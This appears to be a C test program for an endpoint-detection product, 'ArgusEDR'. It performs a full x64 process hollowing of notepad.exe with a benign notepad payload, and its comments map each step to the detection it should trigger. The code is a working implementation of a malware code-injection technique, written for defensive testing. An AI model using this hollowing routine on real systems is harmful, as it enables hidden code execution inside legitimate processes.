/*
 * test_ProcessHollowing.c  (x64)
 * Classic process hollowing adapted for ArgusEDR.
 *
 * Host:    notepad.exe  (spawned suspended)
 * Payload: notepad.exe  (same binary — so victim stays alive long enough to scan)
 *
 * Hollowing sequence (x64):
 *   1. NtQueryInformationProcess  -> get PebBaseAddress
 *   2. ReadProcessMemory (PEB+0x10) -> get victim ImageBase
 *   3. NtUnmapViewOfSection       -> unmap original image
 *   4. VirtualAllocEx (RWX)       -> allocate at payload preferred base
 *   5. WriteProcessMemory         -> copy headers + sections
 *   6. WriteProcessMemory (PEB)   -> update ImageBase
 *   7. GetThreadContext / Rip     -> redirect entry point
 *   8. SetThreadContext
 *   9. ResumeThread
 *
 * Detection chain (requires argus_agent.exe running):
 *
 *   VirtualAllocEx(RWX) hook  -> LOW / MEDIUM for victim PID
 *                              -> YARA scan (empty region — no match yet)
 *   PE-Sieve fast watcher     -> FINDING_PRIVATE_EXECUTABLE  (within 200 ms)
 *   WriteProcessMemory hook   -> HIGH for victim PID
 *                              -> YARA scan on victim
 *                              -> MZ_in_private_memory fires  -> CRITICAL
 *   PE-Sieve structural scan  -> FINDING_PE_IMPLANT          (late evidence)
 *   Agent kill-switch         -> victim terminated            (500 ms grace)
 *
 * Workflow:
 *   1. Start argus_agent.exe
 *   2. Start test_ProcessHollowing.exe
 *      -> hollower PID and victim PID are printed immediately
 *   3. Inject into VICTIM  :  injector.exe <victim_pid>   argus_pesieve.dll
 *      Inject into HOLLOWER:  injector.exe <hollower_pid> argus_hook.dll
 *      (order does not matter; injector.exe is unhooked — only the hollower is hooked)
 *   4. Press ENTER — hollowing sequence executes automatically
 *   5. Watch agent output; press ENTER again to exit
 *
 * NOTE: Do NOT inject pesieve into the hollower via inject_dll() here.
 *       That would call CreateRemoteThread from inside the hooked hollower,
 *       which fires has_remote_thread -> CRITICAL -> victim killed in 500 ms
 *       BEFORE VirtualAllocEx or WriteProcessMemory run.  Use injector.exe
 *       (a separate, unhooked process) to put pesieve into the victim instead.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <processthreadsapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ── ntdll types ──────────────────────────────────────────────────────────────
 * Defined inline to avoid winternl.h / wdbgexts.h / helper.h dependencies.
 * x64 layout: all pointers are 8 bytes.                                      */

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID     Reserved1;
    PVOID     PebBaseAddress;   /* offset 0x08 in x64 struct */
    PVOID     Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID     Reserved3;
} PROCESS_BASIC_INFORMATION;

typedef LONG (NTAPI *PFN_NtQueryInformationProcess)(
    HANDLE, DWORD, PVOID, ULONG, PULONG);

typedef LONG (NTAPI *PFN_NtUnmapViewOfSection)(
    HANDLE ProcessHandle, PVOID BaseAddress);

int main(void)
{
    /* ── Path setup ────────────────────────────────────────────────────────── */
    char notepad_path[MAX_PATH] = {0};
    GetSystemDirectoryA(notepad_path, MAX_PATH);
    strncat(notepad_path, "\\notepad.exe", MAX_PATH - strlen(notepad_path) - 1);

    /* ── Load ntdll functions ──────────────────────────────────────────────── */
    HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
    PFN_NtQueryInformationProcess NtQueryInformationProcess =
        (PFN_NtQueryInformationProcess)GetProcAddress(hNtDll, "NtQueryInformationProcess");
    PFN_NtUnmapViewOfSection NtUnmapViewOfSection =
        (PFN_NtUnmapViewOfSection)GetProcAddress(hNtDll, "NtUnmapViewOfSection");

    if (!NtQueryInformationProcess || !NtUnmapViewOfSection) {
        fprintf(stderr, "  ERROR  ntdll function lookup failed\n");
        return 1;
    }

    /* ── Load payload (notepad.exe) from disk ─────────────────────────────── */
    HANDLE hFile = CreateFileA(notepad_path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "  ERROR  Cannot open payload: %s (%lu)\n",
                notepad_path, GetLastError());
        return 1;
    }
    DWORD fileSize  = GetFileSize(hFile, NULL);
    LPVOID image    = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD bytesRead = 0;
    ReadFile(hFile, image, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)image;
    if (pidh->e_magic != IMAGE_DOS_SIGNATURE) {
        fprintf(stderr, "  ERROR  Payload does not have a valid DOS signature\n");
        VirtualFree(image, 0, MEM_RELEASE);
        return 1;
    }
    PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((LPBYTE)image + pidh->e_lfanew);

    /* ── Spawn victim suspended ────────────────────────────────────────────── */
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessA(NULL, notepad_path, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "  ERROR  CreateProcess(notepad) failed (%lu)\n", GetLastError());
        VirtualFree(image, 0, MEM_RELEASE);
        return 1;
    }

    /* ── Print PIDs and wait for user injections ───────────────────────────── */
    printf("\n  ArgusEDR  /  Process Hollowing test  (x64)\n");
    printf("  ----------------------------------------\n");
    printf("  Host:      %s\n", notepad_path);
    printf("  Payload:   %s  (%lu bytes, %d sections)\n\n",
           notepad_path, fileSize, pinh->FileHeader.NumberOfSections);
    printf("  Hollower PID : %lu   <- inject argus_hook.dll here\n",
           GetProcessId(GetCurrentProcess()));
    printf("  Victim PID   : %lu   <- inject argus_pesieve.dll here\n\n",
           GetProcessId(pi.hProcess));
    printf("  injector.exe %-6lu argus_pesieve.dll   (PE-Sieve into victim)\n",
           GetProcessId(pi.hProcess));
    printf("  injector.exe %-6lu argus_hook.dll      (hooks into hollower)\n\n",
           GetProcessId(GetCurrentProcess()));
    printf("  Do both injections, then press ENTER to begin hollowing...\n");
    getchar();

    /* ── Get victim PEB base and ImageBase ────────────────────────────────── */
    PROCESS_BASIC_INFORMATION pbi;
    ZeroMemory(&pbi, sizeof(pbi));
    NtQueryInformationProcess(pi.hProcess, 0 /* ProcessBasicInformation */,
                              &pbi, sizeof(pbi), NULL);

    /* x64: ImageBaseAddress lives at PEB + 0x10 (NOT 0x08 as in x86) */
    PVOID victim_image_base = NULL;
    ReadProcessMemory(pi.hProcess, (LPBYTE)pbi.PebBaseAddress + 0x10,
                      &victim_image_base, sizeof(PVOID), NULL);
    printf("  [PEB]     victim PebBaseAddress  0x%p\n", pbi.PebBaseAddress);
    printf("            victim ImageBase        0x%p\n\n", victim_image_base);

    /* ── Unmap the victim's original image ────────────────────────────────── */
    LONG status = NtUnmapViewOfSection(pi.hProcess, victim_image_base);
    if (status != 0)
        fprintf(stderr, "  WARN   NtUnmapViewOfSection status=0x%08lX\n", status);
    else
        printf("  [UNMAP]   NtUnmapViewOfSection @ 0x%p\n\n", victim_image_base);

    /* ── VirtualAllocEx at payload's preferred base ───────────────────────── */
    /* Hook in hollower fires: LOW/MEDIUM for victim. YARA scan runs but the
     * region is empty — no match.  PE-Sieve fast watcher (200 ms) will report
     * FINDING_PRIVATE_EXECUTABLE for this RWX region shortly.              */
    LPVOID mem = VirtualAllocEx(pi.hProcess,
                                (LPVOID)(ULONG_PTR)pinh->OptionalHeader.ImageBase,
                                pinh->OptionalHeader.SizeOfImage,
                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) {
        mem = VirtualAllocEx(pi.hProcess, NULL,
                             pinh->OptionalHeader.SizeOfImage,
                             MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    if (!mem) {
        fprintf(stderr, "  ERROR  VirtualAllocEx in victim failed (%lu)\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        VirtualFree(image, 0, MEM_RELEASE);
        return 1;
    }
    printf("  [ALLOC]   VirtualAllocEx -> victim @ 0x%p  (RWX, 0x%x bytes)\n",
           mem, pinh->OptionalHeader.SizeOfImage);
    printf("            Hook: LOW/MEDIUM for victim PID %lu\n", GetProcessId(pi.hProcess));
    printf("            PE-Sieve: FINDING_PRIVATE_EXECUTABLE within 200 ms\n\n");

    /* Let PE-Sieve catch the empty RWX region before writing the PE. */
    printf("  [WAIT]    2s — PE-Sieve observing RWX region...\n\n");
    Sleep(2000);

    /* ── WriteProcessMemory — copy headers and sections ──────────────────── */
    /* Hook in hollower fires: HIGH for victim + YARA scan.
     * YARA finds the MZ header at offset 0 of the RWX region
     * -> MZ_in_private_memory rule -> CRITICAL -> victim killed in 500 ms. */
    if (!WriteProcessMemory(pi.hProcess, mem, image,
                            pinh->OptionalHeader.SizeOfHeaders, NULL)) {
        fprintf(stderr, "  ERROR  WriteProcessMemory (headers) failed (%lu)\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        VirtualFree(image, 0, MEM_RELEASE);
        return 1;
    }
    printf("  [WRITE]   WriteProcessMemory -> victim: PE headers\n");

    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pinh);
    for (int i = 0; i < pinh->FileHeader.NumberOfSections; i++, pSectionHeader++) {
        if (pSectionHeader->SizeOfRawData == 0) continue;

        PBYTE pSectionData = (PBYTE)malloc(pSectionHeader->SizeOfRawData);
        memcpy(pSectionData,
               (LPBYTE)image + pSectionHeader->PointerToRawData,
               pSectionHeader->SizeOfRawData);

        if (!WriteProcessMemory(pi.hProcess,
                                (LPBYTE)mem + pSectionHeader->VirtualAddress,
                                pSectionData,
                                pSectionHeader->SizeOfRawData, NULL))
            fprintf(stderr, "  WARN   WriteProcessMemory section %.8s failed (%lu)\n",
                    (char*)pSectionHeader->Name, GetLastError());
        else
            printf("            section %-2d  %.8s  RVA=0x%08X  size=0x%X\n",
                   i, (char*)pSectionHeader->Name,
                   pSectionHeader->VirtualAddress,
                   pSectionHeader->SizeOfRawData);
        free(pSectionData);
    }

    printf("\n            Hook: HIGH for victim PID %lu  (has_written + has_protected)\n",
           GetProcessId(pi.hProcess));
    printf("            YARA: MZ_in_private_memory -> CRITICAL -> kill in 500 ms\n\n");

    /* Give the agent time to run the YARA scan and for PE-Sieve to send
     * FINDING_PE_IMPLANT as late evidence before the victim dies.          */
    printf("  [WAIT]    3s — YARA scan + PE-Sieve late evidence window\n\n");
    Sleep(3000);

    /* ── Update PEB ImageBase ─────────────────────────────────────────────── */
    WriteProcessMemory(pi.hProcess, (LPBYTE)pbi.PebBaseAddress + 0x10,
                       &mem, sizeof(PVOID), NULL);
    printf("  [PEB]     Updated ImageBase -> 0x%p\n\n", mem);

    /* ── Redirect entry point and resume ─────────────────────────────────── */
    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    ctx.Rip = (DWORD64)(ULONG_PTR)mem + pinh->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);

    printf("  [RIP]     Entry point -> 0x%016llX\n\n", (unsigned long long)ctx.Rip);

    ResumeThread(pi.hThread);
    printf("  [RESUME]  Victim thread running (likely killed by agent momentarily)\n\n");

    /* ── Summary ──────────────────────────────────────────────────────────── */
    printf("  ----------------------------------------\n");
    printf("  Hollowing complete.  Expected agent output for victim PID %lu:\n\n",
           GetProcessId(pi.hProcess));
    printf("    LOW/MEDIUM          VirtualAllocEx hook (RWX allocation)\n");
    printf("    FINDING_PRIVATE_EX  PE-Sieve fast watcher (<200 ms)\n");
    printf("    HIGH                WriteProcessMemory hook\n");
    printf("    CRITICAL            YARA: MZ_in_private_memory (MZ at offset 0 of RWX region)\n");
    printf("    FINDING_PE_IMPLANT  PE-Sieve structural scan (late evidence)\n\n");
    printf("  Victim PID:           %lu\n", GetProcessId(pi.hProcess));
    printf("  Original ImageBase:   0x%p\n", victim_image_base);
    printf("  Injected ImageBase:   0x%p\n\n", mem);

    printf("  Press ENTER to exit...\n");
    getchar();

    VirtualFree(image, 0, MEM_RELEASE);
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
